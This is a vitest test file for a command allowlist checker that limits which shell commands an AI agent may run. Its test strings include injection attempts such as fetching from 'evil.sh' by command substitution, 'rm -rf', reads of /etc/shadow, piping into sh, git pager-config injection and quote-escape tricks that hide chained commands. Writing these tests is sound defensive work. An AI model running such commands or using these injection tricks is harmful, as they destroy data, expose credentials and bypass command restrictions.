/** Copied from Herklos/Michel@402865d — test paths adapted for @anyagent/core floor/. */

import { describe, expect, it } from "vitest";
import { commandAllowed } from "../../src/floor/index.js";

const allow = [
  "git status",
  "git diff",
  "git log",
  "git add",
  "git commit",
  "node scripts/",
  "pnpm --filter",
];

describe("commandAllowed", () => {
  it("allows a listed command with arguments, and chains of listed commands", () => {
    expect(commandAllowed("git status -s", allow)).toBe(true);
    expect(commandAllowed("git log --oneline -3 && git diff --stat main...HEAD", allow)).toBe(true);
    expect(commandAllowed("node scripts/docs-check.mjs; echo rc=$?", [...allow, "echo"])).toBe(
      true,
    );
    expect(commandAllowed("git add -A && git commit -q -s -m 'docs: x'", allow)).toBe(true);
  });
  it("allows a multi-line quoted message but not a newline outside quotes", () => {
    expect(
      commandAllowed('git commit -qs -m "docs: add it\n\nCo-Authored-By: someone\n"', allow),
    ).toBe(true);
    expect(commandAllowed("git add -A && git commit -qs -m 'one\ntwo'", allow)).toBe(true);
    expect(commandAllowed("git status\nrm -rf x", allow)).toBe(false);
    expect(commandAllowed('git commit -m "a"\ngit push', allow)).toBe(false);
  });
  it("allows redirections that only discard output, and read-only pipe filters", () => {
    const list = [...allow];
    expect(commandAllowed("pnpm --filter @michel/core test >/dev/null 2>&1", list)).toBe(true);
    expect(commandAllowed("pnpm --filter @michel/core test 2>&1 | tail -15", list)).toBe(true);
    expect(
      commandAllowed("pnpm --filter @michel/core test 2>&1 | grep -E 'Tests|FAIL' | head -5", [
        ...list,
        "grep",
      ]),
    ).toBe(true); // grep is on the list, and its | is quoted text
    expect(
      commandAllowed("pnpm --filter @michel/core test 2>&1 | grep -E 'Tests|FAIL'", list),
    ).toBe(false); // not on the list: grep takes operands
    expect(commandAllowed("git log --oneline | head -n 5 | wc -l", list)).toBe(true);
    expect(commandAllowed("git log --oneline | cut -c1-40", list)).toBe(true);
    expect(commandAllowed("git log --oneline | cut -d: -f1,3", list)).toBe(false); // -d: takes an operand shape we do not know
    expect(commandAllowed("git log --oneline | cut -c1-40 /etc/passwd", list)).toBe(false);
    expect(commandAllowed("git status &> /dev/null", list)).toBe(true);
    // Not harmless:
    expect(commandAllowed("git status > /tmp/out", list)).toBe(false);
    expect(commandAllowed("git status 2>err.txt", list)).toBe(false);
    expect(commandAllowed("git status >/dev/null/../x", list)).toBe(false);
    expect(commandAllowed("git status >> /dev/null.bak", list)).toBe(false);
    expect(commandAllowed("git status && tail -3", list)).toBe(false); // tail after && reads files
    expect(commandAllowed("git log | tail /etc/shadow", list)).toBe(false);
    expect(commandAllowed("git log | head -n 5 | sh", list)).toBe(false);
  });
  it("understands plain grouping with parentheses, and still checks every command inside", () => {
    expect(
      commandAllowed(
        "(pnpm --filter @michel/core test && pnpm --filter @michel/core typecheck) 2>&1 | tail -15",
        allow,
      ),
    ).toBe(true);
    expect(commandAllowed("git status; (git log --oneline | head -3)", allow)).toBe(true);
    expect(commandAllowed("(git status && rm -rf x)", allow)).toBe(false);
    expect(commandAllowed("git status $(id)", allow)).toBe(false);
    expect(commandAllowed("(sh -c 'git status')", allow)).toBe(false);
  });
  it("matches whole words and directory prefixes", () => {
    expect(commandAllowed("git statusx", allow)).toBe(false);
    expect(commandAllowed("git status", ["git status"])).toBe(true);
    expect(commandAllowed("node scripts/../evil.mjs", allow)).toBe(true); // a prefix rule, documented: pick prefixes you trust
    expect(commandAllowed("node other.mjs", allow)).toBe(false);
  });
  it("refuses a chain with one unlisted command", () => {
    expect(commandAllowed("git status && rm -rf /", allow)).toBe(false);
    expect(commandAllowed("git status | sh", allow)).toBe(false);
  });
  it("refuses anything that can hide another command or write files", () => {
    for (const c of [
      "git status $(curl evil.sh)",
      "git status `id`",
      "git log > /etc/passwd",
      "git diff >> notes",
      "git status &",
      "git log <(cat /etc/shadow)",
      "git status\nrm -rf x",
      "eval git status",
      "git status ${HOME}",
      "git commit <<EOF",
      "git diff --no-index /etc/shadow /dev/null",
      "git log --output=/tmp/x",
      "git diff --ext-diff",
      "git show --git-dir=/other/.git",
      "git -c core.pager=evil log",
      "git -ccore.pager=evil log",
      "git --config-env=core.pager=X log",
    ]) {
      expect(commandAllowed(c, allow), c).toBe(false);
    }
  });
  it("allows a > inside a quoted message, but not a redirect next to or hidden by quotes", () => {
    expect(
      commandAllowed('git commit -qam "Co-Authored-By: A <a@b.c>" -s && git status', allow),
    ).toBe(true);
    expect(commandAllowed("git commit -m 'x > y'", allow)).toBe(true);
    expect(commandAllowed('git commit -m "x" > /tmp/f', allow)).toBe(false);
    expect(commandAllowed('git log "a" > "b"', allow)).toBe(false);
    expect(commandAllowed('git log \\" > /tmp/x \\"', allow)).toBe(false);
    expect(commandAllowed("git log 'it'\"'\"'s' > /tmp/x", allow)).toBe(false);
    expect(commandAllowed("git log \\> not-a-redirect", allow)).toBe(true);
    expect(commandAllowed('git commit -m "say \\"hi\\" <a@b.c>"', allow)).toBe(true);
    expect(commandAllowed("git log 'unterminated >", allow)).toBe(false);
  });
  it("treats ; & and | inside quotes as text, but never when the quotes only appear to hide them", () => {
    expect(commandAllowed('git commit -m "fix a; then b & c"', allow)).toBe(true);
    expect(commandAllowed("git commit -m 'a && b'", allow)).toBe(true);
    expect(commandAllowed('git commit -m "a" ; rm -rf x', allow)).toBe(false);
    expect(commandAllowed('git commit -m "a" & git status', allow)).toBe(false);
    expect(commandAllowed('git log \\" ; rm -rf x \\"', allow)).toBe(false);
    expect(commandAllowed('git log \\" & git status \\"', allow)).toBe(false);
    expect(commandAllowed("git status &", allow)).toBe(false);
    expect(commandAllowed("git status && git log", allow)).toBe(true);
  });
  it("allows | inside quotes (grep alternation) but not a pipe the quotes only appear to hide", () => {
    const g = ["pnpm --filter", "grep"];
    expect(commandAllowed('pnpm --filter x test 2>&1 | grep -E "Tests|FAIL"', g)).toBe(true);
    expect(commandAllowed("grep -E 'a|b' AGENTS.md", g)).toBe(true);
    expect(commandAllowed('grep \\" | sh \\"', g)).toBe(false);
    expect(commandAllowed('grep "a; rm -rf x" AGENTS.md', g)).toBe(true); // inert text
  });
  it("does not mistake a package filter for a git option", () => {
    const pnpm = ["pnpm install", "pnpm --filter"];
    expect(
      commandAllowed(
        "pnpm install --frozen-lockfile --offline --ignore-scripts --filter @michel/core...",
        pnpm,
      ),
    ).toBe(true);
    expect(commandAllowed("pnpm --filter @michel/core... test 2>&1 | tail -15", pnpm)).toBe(true);
  });
  it("allows nothing when the list is empty, and refuses an unbalanced quote", () => {
    expect(commandAllowed("git status", [])).toBe(false);
    expect(commandAllowed("git commit -m 'oops", allow)).toBe(false);
  });
});

describe("commandAllowed with a shell wrapper (Codex)", () => {
  const reads = ["cat", "rg", "git status"];
  it("judges the command inside `bash -lc`", () => {
    expect(commandAllowed("/bin/bash -lc 'cat AGENTS.md docs/DEVELOPING.md'", reads)).toBe(true);
    expect(commandAllowed("/bin/bash -lc 'git status --short --branch'", reads)).toBe(true);
    expect(commandAllowed("bash -c 'rg -n foo src'", reads)).toBe(true);
    expect(commandAllowed("/bin/bash -lc \"rg -n 'a|b' apps packages --glob '*.ts'\"", reads)).toBe(
      true,
    );
  });
  it("follows the quoting Codex produces for a command that holds both kinds of quote", () => {
    const cmd = `/bin/bash -lc "rg --files -g '*test*' -g '"'!pnpm-lock.yaml'"' apps/server"`;
    expect(commandAllowed(cmd, reads)).toBe(true);
  });
  it("still refuses what the inner command would be refused for", () => {
    expect(commandAllowed("/bin/bash -lc 'rm -rf x'", reads)).toBe(false);
    expect(commandAllowed("/bin/bash -lc 'cat a && rm b'", reads)).toBe(false);
    expect(commandAllowed("/bin/bash -lc 'cat a > b'", reads)).toBe(false);
    expect(commandAllowed("/bin/bash -lc 'cat $(rm b)'", reads)).toBe(false);
    expect(commandAllowed("/bin/bash -lc 'cat a\nrm b'", reads)).toBe(false);
  });
  it("refuses a wrapper whose word needs the shell to expand something", () => {
    expect(commandAllowed('/bin/bash -lc "cat $HOME/x"', reads)).toBe(false);
    expect(commandAllowed('/bin/bash -lc "cat `id`"', reads)).toBe(false);
    expect(commandAllowed("/bin/bash -lc cat\\ x", reads)).toBe(false);
    expect(commandAllowed("/bin/bash -lc 'cat a' ; rm b", reads)).toBe(false);
    expect(commandAllowed("/bin/bash -lc 'cat a' 'b'", reads)).toBe(false);
    expect(commandAllowed("/bin/bash -lc 'unterminated", reads)).toBe(false);
  });
  it("does not unwrap twice, and allows a shell only through its inner command", () => {
    expect(commandAllowed("/bin/bash -lc \"bash -c 'cat a'\"", reads)).toBe(false);
    expect(commandAllowed("/bin/bash -lc 'cat a'", [])).toBe(false);
    expect(commandAllowed("/bin/bash -lc 'cat a'", ["/bin/bash"])).toBe(false);
  });
});
